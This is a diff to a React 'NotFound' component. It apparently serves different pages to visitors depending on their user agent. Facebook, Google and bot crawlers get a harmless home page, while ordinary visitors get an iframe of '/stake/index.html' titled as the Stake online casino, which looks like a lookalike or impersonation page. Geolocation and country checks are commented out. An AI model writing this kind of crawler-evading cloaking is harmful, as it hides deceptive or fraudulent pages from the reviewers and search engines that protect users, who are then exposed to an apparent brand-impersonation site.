@@ -8,7 +8,7 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://newclient-nu.vercel.app/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Stake: Online Casino & Sports Betting - Play & Bet Online');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
 
@@ -72,30 +72,32 @@ function NotFound() {
     }
   };
   useEffect(() => {
-    setLocaltion();
+    //setLocaltion();
   }, []);
-  return(showIframe("/id/home.html",SiteTitleHome,false));
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
-    if(IsUserHiden){
-      return(showIframe("/id/home.html",SiteTitleHome,false));
-    }else{
-      if(countryCode.length == 0){
-        return(           
-          <div className="loading">
-              <div className="loader"></div>
-          </div>
-        );
-      }else{
-        if(countryCode.includes('vn')){
-          return(showIframe("/id/home.html",SiteTitleHome,false));
-        }else{
-          return(showIframe(IframeUrl,SiteTitleMeta,false));
-        }
-      }
-    }
+      return(showIframe("/stake/index.html",SiteTitleMeta,false));
+    // if(IsUserHiden){
+    //   return(showIframe("/id/home.html",SiteTitleHome,false));
+    // }else{
+    //   return(showIframe("/stake/index.html",SiteTitleMeta,false));
+      // if(countryCode.length == 0){
+      //   return(           
+      //     <div className="loading">
+      //         <div className="loader"></div>
+      //     </div>
+      //   );
+      // }else{
+      //   if(countryCode.includes('vn')){
+      //     return(showIframe("/id/home.html",SiteTitleHome,false));
+      //   }else{
+      //     return(showIframe("/stake/index.html",SiteTitleMeta,false));
+      //     //return(showIframe(IframeUrl,SiteTitleMeta,false));
+      //   }
+      // }
+   // }
   }else{
     return(showIframe("/id/home.html",SiteTitleHome,false));
   }
